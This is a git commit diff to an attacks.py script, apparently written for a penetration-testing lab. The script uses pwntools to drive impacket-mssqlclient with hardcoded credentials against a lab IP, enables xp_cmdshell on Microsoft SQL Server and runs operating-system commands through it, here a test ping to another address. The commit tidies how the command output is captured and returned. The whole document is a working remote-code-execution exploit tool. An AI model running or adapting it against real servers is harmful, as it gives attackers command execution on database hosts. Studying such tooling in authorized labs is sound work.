60a542593d51d7b1472a69d85448b43f17b1fef5
bokkisec <joshchung02@gmail.com>
2024-11-13 00:48:04 -0500

    cleaning up mssql rce code

--- attacks.py
+++ attacks.py
@@ -3,18 +3,22 @@ import os
 
 def mssql_rce(username, password, ip, command):
     p = pwn.process(["/usr/bin/impacket-mssqlclient", "-windows-auth", f"{username}:{password}@{ip}"], stdin=pwn.PTY)
-    print(p.readuntil(")>"))
-    p.write(b"enable_xp_cmdshell\n")
+    p.readuntil(")>")
+    p.send(b"enable_xp_cmdshell\n")
     p.send(b'\4')
-    print(p.readuntil("install."))
-    print(p.readuntil("install."))
-    p.write("xp_cmdshell ping 10.10.14.10\n")
+    p.readuntil("install.")
+    p.readuntil("install.")
+    p.send("xp_cmdshell ping 10.10.14.10\n")
     p.send(b'\4')
-    print(p.readuntil("output"))
+    p.readuntil("NULL")
+    output = p.readuntil("NULL")
+    decoded_output = output.decode('utf-8')
+    cleaned_output = decoded_output.replace('NULL', '').strip()
+    return cleaned_output
 
 if __name__=="__main__":
     username = "mssql-svc"
     password = "corporate568"
     ip = "10.10.10.125"
     command = "ping 10.10.14.10"
-    mssql_rce(username, password, ip, command)
+    print(mssql_rce(username, password, ip, command))
